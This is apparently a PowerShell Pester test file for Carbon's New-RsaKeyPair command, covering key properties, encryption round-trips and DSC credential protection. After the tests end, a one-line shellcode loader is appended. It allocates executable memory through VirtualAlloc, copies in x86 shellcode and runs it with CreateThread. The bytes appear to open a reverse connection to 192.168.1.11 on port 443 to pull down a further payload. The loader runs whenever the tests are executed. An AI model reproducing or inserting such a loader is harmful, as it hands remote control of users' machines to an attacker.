











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$tempDir = $null
$privateKeyPassword = (New-Credential -User 'doesn''t matter' -Password 'fubarsnafu').Password
$subject = $null
$publicKeyPath = $null
$privateKeyPath = $null

Describe 'New-RsaKeyPair' {

    function Assert-KeyProperty
    {
        param(
            $Length = 4096,
            [datetime]
            $ValidTo,
            $Algorithm = 'sha512RSA'
        )

        Set-StrictMode -Version 'Latest'

        if( -not $ValidTo )
        {
            $ValidTo = (Get-Date).AddDays( [Math]::Floor(([DateTime]::MaxValue - [DateTime]::UtcNow).TotalDays) )
        }

        $cert = Get-Certificate -Path $publicKeyPath
        
        [timespan]$span = $ValidTo - $cert.NotAfter
        $span.TotalDays | Should BeGreaterThan (-2)
        $span.TotalDays | Should BeLessThan 2
        $cert.Subject | Should Be $subject
        $cert.PublicKey.Key.KeySize | Should Be $Length
        $cert.PublicKey.Key.KeyExchangeAlgorithm | Should Be 'RSA-PKCS1-KeyEx'
        $cert.SignatureAlgorithm.FriendlyName | Should Be $Algorithm
        $keyUsage = $cert.Extensions | Where-Object { $_ -is [Security.Cryptography.X509Certificates.X509KeyUsageExtension] }
        $keyUsage | Should Not BeNullOrEmpty
        $keyUsage.KeyUsages.HasFlag([Security.Cryptography.X509Certificates.X509KeyUsageFlags]::DataEncipherment) | Should Be $true
        $keyUsage.KeyUsages.HasFlag([Security.Cryptography.X509Certificates.X509KeyUsageFlags]::KeyEncipherment) | Should Be $true
        $enhancedKeyUsage = $cert.Extensions | Where-Object { $_ -is [Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] }
        $enhancedKeyUsage | Should Not BeNullOrEmpty

        
        $osVersion = (Get-WmiObject -Class 'Win32_OperatingSystem').Version
        if( $osVersion -notmatch '6.1\b' )
        {
            $usage = $enhancedKeyUsage.EnhancedKeyUsages | Where-Object { $_.FriendlyName -eq 'Document Encryption' }
            $usage | Should Not BeNullOrEmpty
        }
    }

    BeforeEach {
        $tempDir = New-TempDirectory -Prefix $PSCommandPath
        $Global:Error.Clear()

        $subject = 'CN={0}' -f [Guid]::NewGuid()
        $publicKeyPath = Join-Path -Path $tempDir -ChildPath 'public.cer'
        $privateKeyPath = Join-Path -Path $tempDir -ChildPath 'private.pfx'
    }

    AfterEach {
        Remove-Item -Path $tempDir -Recurse
    }

    It 'should generate a public/private key pair' {

        $output = New-RsaKeyPair -Subject $subject -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword
        $output | Should Not BeNullOrEmpty
        $output.Count | Should Be 2

        $publicKeyPath | Should Exist
        $output[0].FullName | Should Be $publicKeyPath

        $privateKeyPath | Should Exist
        $output[1].FullName | Should Be $privateKeyPath

        Assert-KeyProperty

        
        $secret = [IO.Path]::GetRandomFileName()
        $protectedSecret = Protect-String -String $secret -Certificate $publicKeyPath
        $decryptedSecret = Unprotect-String -ProtectedString $protectedSecret -PrivateKeyPath $privateKeyPath -Password $privateKeyPassword
        $decryptedSecret | Should Be $secret

        $publicKey = Get-Certificate -Path $publicKeyPath
        $publicKey | Should Not BeNullOrEmpty

        
        $configData = @{
            AllNodes = @(
                @{
                    NodeName = 'localhost';
                    CertificateFile = $PublicKeyPath;
                    Thumbprint = $publicKey.Thumbprint;
                }
            )
        }

        configuration TestEncryption
        {
            Set-StrictMode -Off

            Import-DscResource -ModuleName 'PSDesiredStateConfiguration'

            node $AllNodes.NodeName
            {
                User 'CreateDummyUser'
                {
                    UserName = 'fubarsnafu';
                    Password = (New-Credential -UserName 'fubarsnafu' -Password 'Password1')
                }
            }
        }

        & TestEncryption -ConfigurationData $configData -OutputPath $tempDir

        
        $dscRegKey = 'HKLM:\SOFTWARE\Microsoft\PowerShell\3\DSC'
        $dscRegKeyErrorMessages = $Global:Error |
                                  Where-Object { $_ -is [System.Management.Automation.ErrorRecord] } |
                                  Where-Object { $_.Exception.Message -like ('*Cannot find path ''{0}''*' -f $dscRegKey) }

        foreach ($error in $dscRegKeyErrorMessages)
        {
            $Global:Error.Remove($error)
        }

        $Global:Error.Count | Should Be 0
        Join-Path -Path $tempDir -ChildPath 'localhost.mof' | Should Not Contain 'Password1'
    }

    if( Get-Command -Name 'Protect-CmsMessage' -ErrorAction Ignore )
    {
        
        It 'should generate key pairs that can be used by CMS cmdlets' {
            $output = New-RsaKeyPair -Subject 'CN=to@example.com' -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword

            $cert = Install-Certificate -Path $privateKeyPath -StoreLocation CurrentUser -StoreName My -Password $privateKeyPassword

            try
            {
                $message = 'fubarsnafu'
                $protectedMessage = Protect-CmsMessage -To $publicKeyPath -Content $message
                Unprotect-CmsMessage -Content $protectedMessage | Should Be $message
            }
            finally
            {
                Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation CurrentUser -StoreName My
            }
        }
    }


    It 'should generate key with custom configuration' {
        $validTo = [datetime]::Now.AddDays(30)
        $length = 2048

        $output = New-RsaKeyPair -Subject $subject `
                                 -PublicKeyFile $publicKeyPath `
                                 -PrivateKeyFile $privateKeyPath `
                                 -Password $privateKeyPassword `
                                 -ValidTo $validTo `
                                 -Length $length `
                                 -Algorithm sha1

        Assert-KeyProperty -Length $length -ValidTo $validTo -Algorithm 'sha1RSA'

    }

    It 'should reject subjects that don''t begin with CN=' {
        { New-RsaKeyPair -Subject 'fubar' -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $privateKeyPassword } | Should Throw
        $Global:Error[0] | Should Match 'does not match'
    }

    It 'should not protect private key' {
        $output = New-RsaKeyPair -Subject $subject -PublicKeyFile $publicKeyPath -PrivateKeyFile $privateKeyPath -Password $null
        $output.Count | Should Be 2

        $privateKey = Get-Certificate -Path $privateKeyPath
        $privateKey | Should Not BeNullOrEmpty

        $secret = [IO.Path]::GetRandomFileName()
        $protectedSecret = Protect-String -String $secret -PublicKeyPath $publicKeyPath
        Unprotect-String -ProtectedString $protectedSecret -PrivateKeyPath $privateKeyPath | Should Be $secret
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

